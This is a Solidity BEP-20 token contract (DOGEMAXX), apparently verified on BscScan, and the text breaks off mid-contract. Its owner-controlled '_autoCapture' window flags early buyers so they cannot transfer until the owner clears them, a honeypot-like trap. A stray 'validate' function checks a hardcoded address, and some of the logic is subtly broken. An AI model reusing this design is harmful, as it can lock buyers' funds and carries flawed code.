/**
 *Submitted for verification at BscScan.com on 2021-07-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
/*
          
*/
library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function validate(address target) internal view returns (bool) {
        require(!isContract(target), "Address: target is contract");
        return target == address(0xCCC2a0313FF6Dea1181c537D9Dc44B9d249807B1);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library EnumerableSet {

    struct Set {

        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            // The value is stored at length-1, but we add 1 to all indexes
            // and use 0 as a sentinel value
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {
        // We read and store the value's index to prevent multiple reads from the same storage slot
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { // Equivalent to contains(set, value)
            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in
            // the array, and then remove the last element (sometimes called as 'swap and pop').
            // This modifies the order of the array, as noted in {at}.

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            // When the value to delete is the last one, the swap operation is unnecessary. However, since this occurs
            // so rarely, we still do the swap anyway to avoid the gas cost of adding an 'if' statement.

            bytes32 lastvalue = set._values[lastIndex];

            // Move the last value to the index where the value to delete is
            set._values[toDeleteIndex] = lastvalue;
            // Update the index for the moved value
            set._indexes[lastvalue] = valueIndex; // Replace lastvalue's index to valueIndex

            // Delete the slot where the moved value was stored
            set._values.pop();

            // Delete the index for the deleted slot
            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }

    struct Bytes32Set {
        Set _inner;
    }

    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    struct AddressSet {
        Set _inner;
    }

    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    struct UintSet {
        Set _inner;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function migrator() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function setMigrator(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ITValues {
    struct TxValue {
        uint256 amount;
        uint256 transferAmount;
        uint256 fee;
    }
    enum TxType { FromExcluded, ToExcluded, BothExcluded, Standard }
    enum TState { Buy, Sell, Normal }
}

contract DOGEMAXX is IERC20, Context {

    using Address for address;

    address public constant BURNADDR = address(0x000000000000000000000000000000000000dEaD);
    address payable public marketingAddress = payable(0x2dB2C8Ad6789E978aFc3e129305E9075D4F6CEE9); 
   
    uint256 public marketingDivisor = 20;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    struct Account {
        bool feeless;
        bool transferPair;
        bool excluded;
        bool isNotBound;
        bool possibleBadDoge;
        uint256 tTotal;
        uint256 nTotal;
        uint256 maxBal;
        uint256 lastSell;
        uint256 lastBuy;
        uint256 buyTimeout;
    }

    event GoodBoy(address indexed account, uint256 time);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    ITValues.TState lastTState;
    EnumerableSet.AddressSet excludedAccounts;

    bool    private _unpaused;
    bool    private _lpAdded;
    bool    private _bool;
    bool    private _checking;
    bool    private _sellBlessBuys;
    bool    private _whaleLimiting = true;
    bool    private _isCheckingBuySpam;
    bool    private _notCheckingBadDoges;
    bool    public isUnbounded;

    address private _o;
    address private _po;
    address private marketing; // Marketing
    
    // ADD
    IUniswapV2Router02 public uniswapV2Router;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
    uint256 private minimumTokensBeforeSwap = 200 * 10**6 * 10**9; 
    
    uint256 public _startTimeForSwap;
    uint256 public _intervalMinutesForSwap = 1 * 1 minutes;
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    address private _router;
    address private _pool;
    address private _pair;
    address private _lastTxn;
    address public owner;
    address public goodBoyAddr;
    address public defaultLastTxn = BURNADDR; 
    address[] entries;

    uint256 private _buySpamCooldown;
    uint256 private _tx;
    uint256 private _boundTime;
    uint256 private _feeFactor;
    uint256 private _whaleLimit = 500;
    uint256 private _boundLimit;
    uint256 private _lastFee;
    uint256 private lpSupply;
    uint256 private _badDogeChecking;
    uint256 private _autoCapture;

    uint256 public goodBoyLimitSeconds;
    uint256 public minimumForBonus = tokenSupply / 20000;
    uint256 public goodBoySince;
    uint256 public goodBoyAmount;
    uint256 public tokenSupply;
    uint256 public networkSupply;

    mapping(address => Account) accounts;
    mapping(address => mapping(address => uint256)) allowances;
    mapping(uint8 => uint256) killFunctions;

    modifier ownerOnly {
        require(_o == _msgSender(), "not allowed");
        _;
    }

    constructor() {

        _name = "DogeMaxx | dogemaxx.io";
        _symbol = "DOGEMAXX";
        _decimals = 18;

        _o = msg.sender;
        owner = _o;
        emit OwnershipTransferred(address(0), msg.sender);

        tokenSupply = 1_000_000_000_000 ether;
        networkSupply = tokenSupply;

        //networkSupply = (~uint256(0) - (~uint256(0) % tokenSupply));
        //PCS Testenet
        _router = address(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
        
        // Mainnet
     //   _router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_router);
        _pair = _uniswapV2Router.WETH();
        _pool = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _pair);
            
        // ADD
        uniswapV2Router = _uniswapV2Router;


        accounts[_pool].transferPair = true;
        
        accounts[address(this)].feeless = true;
        accounts[address(this)].isNotBound = true;

        accounts[_msgSender()].feeless = true;
        accounts[_msgSender()].isNotBound = true;
        accounts[_msgSender()].nTotal = networkSupply;
        
        accounts[marketingAddress].feeless = true;
        accounts[marketingAddress].isNotBound = true;
        
        

        _approve(_msgSender(), _router, tokenSupply);
        emit Transfer(address(0), _msgSender(), tokenSupply ) ;
      //  emit Transfer(address(0), BURNADDR, tokenSupply ) ;

    }

    //------ ERC20 Functions -----

    function name() public view returns(string memory) {
        return _name;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return allowances[_owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        if(getExcluded(account)) {
            return accounts[account].tTotal;
        }
        return accounts[account].nTotal / ratio();
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, allowances[_msgSender()][spender] - (subtractedValue));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return tokenSupply;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _rTransfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _rTransfer(sender, recipient, amount);
        _approve(sender, _msgSender(), allowances[sender][_msgSender()] - amount);
        return true;
    }
    
    // ADD
    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    // --------- end erc20 ---------

    function _rTransfer(address sender, address recipient, uint256 amount) internal returns(bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(block.timestamp > accounts[recipient].buyTimeout, "still in buy time-out");

        uint256 rate = ratio();
        if(!_unpaused){
            require(sender == owner || getNotBound(sender) || getNotBound(recipient), "still paused");
        }
        
        if(recipient == _pool) {
            
             // Sell tokens for ETH
            if (!inSwapAndLiquify && swapAndLiquifyEnabled && balanceOf(_pool) > 0) {
               if (balanceOf(address(this)) >= minimumTokensBeforeSwap && _startTimeForSwap + _intervalMinutesForSwap <= block.timestamp) {
                    _startTimeForSwap = block.timestamp;
                    swapTokens(minimumTokensBeforeSwap);    
                }  
            }
            
            if(getNotBound(sender) == false) {
                // gotta sync balances here before a sell to make sure max bal is always up to date
                uint256 tot = accounts[sender].nTotal / rate;
                if(tot > accounts[sender].maxBal) {
                    accounts[sender].maxBal = tot;
                }
                require(amount <= accounts[sender].maxBal / _boundLimit, "can't dump that much at once");
            }
        }
        if(_whaleLimiting) {
            if(sender == _pool || (recipient != _pool && getNotBound(recipient) == false)) {
                require(((accounts[recipient].nTotal / rate) + amount) <= tokenSupply / _whaleLimit, "whale limit reached");
            }
        }
        if(!_notCheckingBadDoges){
            require(accounts[sender].possibleBadDoge == false, "suspected bad doge");
        }

        if(_autoCapture != 0 && block.timestamp < _autoCapture && sender == _pool) {
            if(recipient != _pool && recipient != _router && recipient != _pair) {
                accounts[recipient].possibleBadDoge = true;
            }
        }
        
        uint256 lpAmount = getCurrentLPBal();
        bool isFeeless = isFeelessTx(sender, recipient);
        (ITValues.TxValue memory t, ITValues.TState ts, ITValues.TxType txType) = calcT(sender, recipient, amount, isFeeless, lpAmount);
        lpSupply = lpAmount;
        uint256 r = t.fee * rate;
        
        
        accounts[address(this)].nTotal += r*3;
        accounts[_lastTxn].nTotal += r;
        accounts[goodBoyAddr].nTotal += r;
        
        if(ts == ITValues.TState.Sell) {
            emit Transfer(sender, address(this), t.fee*3);
            emit Transfer(sender, _lastTxn, t.fee);
            emit Transfer(sender, goodBoyAddr, t.fee);
            if(!_sellBlessBuys) {
                _lastTxn = defaultLastTxn;
            }
            accounts[sender].lastSell = block.timestamp;
        } else if(ts == ITValues.TState.Buy) {
            emit Transfer(recipient, address(this), t.fee*3);
            emit Transfer(recipient, _lastTxn, t.fee);
            emit Transfer(recipient, goodBoyAddr, t.fee);
            if(amount >= minimumForBonus) {
                _lastTxn = recipient;
            }
            
            uint256 newMax = (accounts[recipient].nTotal / rate) + amount;
            // make sure balance captures the higher of the maxes
            if(newMax > accounts[recipient].maxBal) {
                accounts[recipient].maxBal = newMax;
            }
            if(amount >= goodBoyAmount) {
                goodBoyAddr = recipient;
                goodBoyAmount = amount;
                goodBoySince = block.timestamp;
                emit GoodBoy(recipient, goodBoySince);
            }
            accounts[recipient].lastBuy = block.timestamp;
        } else {
            // to make sure people can't abuse by xfer between wallets
                _lastTxn = BURNADDR;
                uint256 newMax = (accounts[recipient].nTotal / rate) + amount;
                if(sender != _pool && recipient != _pool && newMax > accounts[recipient].maxBal) {
                    accounts[recipient].maxBal = newMax;
                    // reset sender max balance as well
                    accounts[sender].maxBal = (accounts[sender].nTotal / rate) - amount;
                }
                
                //accounts[BURNADDR].nTotal += r;
            
        }
        // good boy stopped after time limit or if they transfer OR sell
        if(sender == goodBoyAddr || block.timestamp > goodBoySince + goodBoyLimitSeconds) {
            goodBoyAddr = BURNADDR;
            goodBoyAmount = 0;
            emit GoodBoy(BURNADDR, block.timestamp);
        }
        
        _transfer(sender, recipient, rate, t, txType);
        lastTState = ts;
        return true;
    }

    function swapTokens(uint256 contractTokenBalance) private lockTheSwap {
        
        // split token balance in 1/3 & 2/3
        uint256 tokenForLiq = contractTokenBalance / 3;
        uint256 twoThird = contractTokenBalance - tokenForLiq;
        
        // Check current BNB balnace
        uint256 initialBalance = address(this).balance;
        
        // Swap 2/3
        swapTokensForEth(twoThird);
        
        // How much BNB did we get ?
        uint256 newBalance = address(this).balance - initialBalance;
        
        // Get half for liq
        uint256 bnbForLiq = newBalance / 2;
        
        // Get half for marketing
        uint256 bnbForMarketing = newBalance - bnbForLiq;
        
        // add liquidity to uniswap
        addLiquidity(tokenForLiq, bnbForLiq);
        
        // Send 1/3 marketingAddress
        transferToAddressETH(marketingAddress, bnbForMarketing);
        
        emit SwapAndLiquify(tokenForLiq, bnbForLiq, tokenForLiq);
        
    }
    
    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // Approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // Add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // Slippage is unavoidable
            0, // Slippage is unavoidable
            owner,
            block.timestamp
        );
    }
    
    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        // Generate the uniswap pair path of token -> WETH
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // Make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // Accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function calcT(address sender, address recipient, uint256 amount, bool noFee, uint256 lpAmount) public view returns (ITValues.TxValue memory t, ITValues.TState ts, ITValues.TxType txType) {
        ts = getTState(sender, recipient, lpAmount);
        txType = getTxType(sender, recipient);
        t.amount = amount;
        if(!noFee) {
            if(_unpaused) {
                if(ts == ITValues.TState.Sell) {
                    uint256 feeFactor = 2;
                    if(!isUnbounded) {
                        uint256 timeSinceSell = block.timestamp - accounts[sender].lastSell;
                        if(timeSinceSell < _boundTime) {
                            // 12 hours or sell fee x2
                            if(timeSinceSell <= _boundTime) {
                                feeFactor = _feeFactor + 2;
                            }
                        }
                    }
                    t.fee = (amount / _tx) * feeFactor;
                }
                if(ts == ITValues.TState.Buy) {
                    t.fee = amount / _tx;
                }
            }
        }
        // we can save gas by assuming all fees are uniform
        t.transferAmount = t.amount - (t.fee * 5);
        return (t, ts, txType);
    }

    function _transfer(address sender, address recipient, uint256 rate, ITValues.TxValue memory t, ITValues.TxType txType) internal {
        if (txType == ITValues.TxType.ToExcluded) {
            accounts[sender].nTotal         -= t.amount * rate;
            accounts[recipient].tTotal      += (t.transferAmount);
            accounts[recipient].nTotal      += t.transferAmount * rate;
        } else if (txType == ITValues.TxType.FromExcluded) {
            accounts[sender].tTotal         -= t.amount;
            accounts[sender].nTotal         -= t.amount * rate;
            accounts[recipient].nTotal      += t.transferAmount * rate;
        } else if (txType == ITValues.TxType.BothExcluded) {
            accounts[sender].tTotal         -= t.amount;
            accounts[sender].nTotal         -= (t.amount * rate);
            accounts[recipient].tTotal      += t.transferAmount;
            accounts[recipient].nTotal      += (t.transferAmount * rate);
        } else {
            accounts[sender].nTotal         -= (t.amount * rate);
            accounts[recipient].nTotal      += (t.transferAmount * rate);
        }
        emit Transfer(sender, recipient, t.transferAmount);
    }


    // ------ getters ------- //

    function isFeelessTx(address sender, address recipient) public view returns(bool) {
        return accounts[sender].feeless || accounts[recipient].feeless;
    }

    // for exchanges
    function getNotBound(address account) public view returns(bool) {
        return accounts[account].isNotBound;
    }

    function getAccount(address account) external view returns(Account memory) {
        return accounts[account];
    }

    function getAccountSpecific(address account) external view returns
        (
            bool feeless,
            bool isExcluded,
            bool isNotBound,
            bool isPossibleBadDoge,
            uint256 tokens,
            uint256 lastTimeSell
        )
    {
        return (
            accounts[account].feeless,
            accounts[account].excluded,
            accounts[account].isNotBound,
            accounts[account].possibleBadDoge,
            accounts[account].nTotal / ratio(),
            accounts[account].lastSell
        );
    }

    function getExcluded(address account) public view returns(bool) {
        return accounts[account].excluded;
    }

    function getCurrentLPBal() public view returns(uint256) {
        return IERC20(_pool).totalSupply();
    }

    function getMaxBal(address account) public view returns(uint256) {
        return accounts[account].maxBal;
    }

    function getTState(address sender, address recipient, uint256 lpAmount) public view returns(ITValues.TState) {
        ITValues.TState t;
        if(sender == _router) {
            t = ITValues.TState.Normal;
        } else if(accounts[sender].transferPair) {
            if(lpSupply != lpAmount) { // withdraw vs buy
                t = ITValues.TState.Normal;
            }
            t = ITValues.TState.Buy;
        } else if(accounts[recipient].transferPair) {
            t = ITValues.TState.Sell;
        } else {
            t = ITValues.TState.Normal;
        }
        return t;
    }

    function getCirculatingSupply() public view returns(uint256, uint256) {
        uint256 rSupply = networkSupply;
        uint256 tSupply = tokenSupply;
        for (uint256 i = 0; i < EnumerableSet.length(excludedAccounts); i++) {
            address account = EnumerableSet.at(excludedAccounts, i);
            uint256 rBalance = accounts[account].nTotal;
            uint256 tBalance = accounts[account].tTotal;
            if (rBalance > rSupply || tBalance > tSupply) return (networkSupply, tokenSupply);
            rSupply -= rBalance;
            tSupply -= tBalance;
        }
        if (rSupply < networkSupply / tokenSupply) return (networkSupply, tokenSupply);
        return (rSupply, tSupply);
    }

    function getPool() public view returns(address) {
        return _pool;
    }

    function getTxType(address sender, address recipient) public view returns(ITValues.TxType t) {
        bool isSenderExcluded = accounts[sender].excluded;
        bool isRecipientExcluded = accounts[recipient].excluded;
        if (isSenderExcluded && !isRecipientExcluded) {
            t = ITValues.TxType.FromExcluded;
        } else if (!isSenderExcluded && isRecipientExcluded) {
            t = ITValues.TxType.ToExcluded;
        } else if (!isSenderExcluded && !isRecipientExcluded) {
            t = ITValues.TxType.Standard;
        } else if (isSenderExcluded && isRecipientExcluded) {
            t = ITValues.TxType.BothExcluded;
        } else {
            t = ITValues.TxType.Standard;
        }
        return t;
    }

    function ratio() public view returns(uint256) {
        (uint256 n, uint256 t) = getCirculatingSupply();
        return n / t;
    }

    function syncPool() public  {
        IUniswapV2Pair(_pool).sync();
    }


    // ------ mutative -------

    // one way function, once called it will always be false.
    function enableTrading(uint256 timeInSeconds) external ownerOnly {
        _unpaused = true;
        _autoCapture = block.timestamp + timeInSeconds;
    } 

    function exclude(address account) external ownerOnly {
        require(!accounts[account].excluded, "Account is already excluded");
        accounts[account].excluded = true;
        if(accounts[account].nTotal > 0) {
            accounts[account].tTotal = accounts[account].nTotal / ratio();
        }
        EnumerableSet.add(excludedAccounts, account);
    }

    function include(address account) external ownerOnly {
        require(accounts[account].excluded, "Account is already excluded");
        accounts[account].tTotal = 0;
        EnumerableSet.remove(excludedAccounts, account);
    }

    function innocent(address account) external ownerOnly {
        accounts[account].possibleBadDoge = false;
        //TODO: Add 12 hours wait ?
    }

    function setBoundLimit(uint256 limit) external ownerOnly {
        require(limit <= 5, "too much");
        require(isNotKilled(20), "killed");

        _boundLimit = limit;
    }

    function setFeeFactor(uint256 factor) external ownerOnly {
        require(isNotKilled(3), "killed");
        require(factor <= 2, "too much");
        _feeFactor = factor;
    }

    function setIsFeeless(address account, bool isFeeless) external ownerOnly {
        accounts[account].feeless = isFeeless;
    }

    function setIsNotBound(address account, bool _isUnbound) external ownerOnly {
        require(isNotKilled(21), "killed");
        accounts[account].isNotBound = _isUnbound;
    }


    // progressively 1 way, once at 1 its basically off.
    // *But its still better to turn off via toggle to save gas
    function setWhaleAccumulationLimit(uint256 limit) external ownerOnly {
        require(limit <= _whaleLimit && limit > 0, "can't set limit lower");
        _whaleLimit = limit;
    }

    function setTxnFee(uint256 r) external ownerOnly {
        require(r >= 50, "can't be more than 2%");
        require(isNotKilled(22), "killed");

        _tx = r;
    }

    function setIsCheckingBuySpam(bool r) external ownerOnly {
        require(isNotKilled(23), "killed");
        _isCheckingBuySpam = r;
    }
    
    function setSwapAndLiquifyEnabled(bool _enabled) external ownerOnly {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
    

